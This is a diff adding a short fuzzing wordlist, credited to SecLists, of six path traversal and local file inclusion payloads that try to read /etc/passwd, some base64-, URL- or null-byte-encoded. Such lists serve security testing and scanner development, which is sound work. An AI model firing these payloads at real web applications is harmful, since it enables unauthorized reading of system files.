@@ -1,0 +1,8 @@
+# Copied from MIT-licensed (https://github.com/danielmiessler/SecLists/blob/master/LICENSE)
+# file https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+../../../../../../../../../../../../../../../../../../etc/passwd
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+///////../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd%00
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%00/etc/passwd%00
